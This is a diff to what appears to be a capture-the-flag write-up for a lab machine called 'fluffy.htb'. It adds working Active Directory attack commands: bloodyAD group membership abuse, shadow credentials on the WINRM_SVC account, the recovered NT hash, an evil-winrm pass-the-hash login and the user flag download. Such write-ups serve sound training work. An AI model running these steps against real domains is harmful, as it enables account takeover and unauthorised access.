@@ -246,10 +246,54 @@ We find out that:
 - The `Service Accounts` group has a `GenericWrite` permission on the `WINRM_SVC` account.
 - The `WINRM_SVC` account has a `CanPSRemote` permission on the domain controller.
 
-This means we need to:
+This means we have a clear path to exploit.
 
-- Add p.agila to Service Accounts Group
-- Reset WINRM_SVC Password
-- Access Domain Controller via WinRM
+The first step is adding the user `p.agila` to the `Service Accounts` group using `bloodyAD`.
+
+```bash
+./bloodyAD.py --host 10.129.232.88 -d fluffy.htb -u p.agila -p prometheusx-303 add groupMember "Service Accounts" p.agila
+```
+
+Now that we have a `GenericWrite` permission, the next step is to add shadow credentials to the `WINRM_SVC` service account.
+
+```bash
+./bloodyAD.py --host 10.129.232.88 -d fluffy.htb -u p.agila -p prometheusx-303 add shadowCredentials winrm_svc
+```
+
+This gives us the NT Hash for the `WINRM_SVC` service account.
+
+```bash
+[+] KeyCredential generated with following sha256 of RSA key: 6afd9b4210821f5f7a980aed04c1a95106d1093bcbbed35e13fc2c622818495e
+[+] TGT stored in ccache file winrm_svc_ta.ccache
+
+NT: 33bd09dcd697600edf6b3a7af4875767
+```
+
+Once we have the NT Hash for the, we can connect with `evil-winrm` using the `WINRM_SVC` service account.
+
+```bash
+evil-winrm -i 10.129.232.88 -u winrm_svc -H 33bd09dcd697600edf6b3a7af4875767
+```
+
+After we connect, we can find the `user.txt` flag in the `Desktop` directory.
+
+```bash
+*Evil-WinRM* PS C:\Users\winrm_svc\Desktop> ls
+
+
+    Directory: C:\Users\winrm_svc\Desktop
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-ar---        9/12/2025   7:32 PM             34 user.txt
+
+
+*Evil-WinRM* PS C:\Users\winrm_svc\Desktop> download user.txt
+
+Info: Downloading C:\Users\winrm_svc\Desktop\user.txt to user.txt
+
+Info: Download successful!
+```
 
 To be continued !
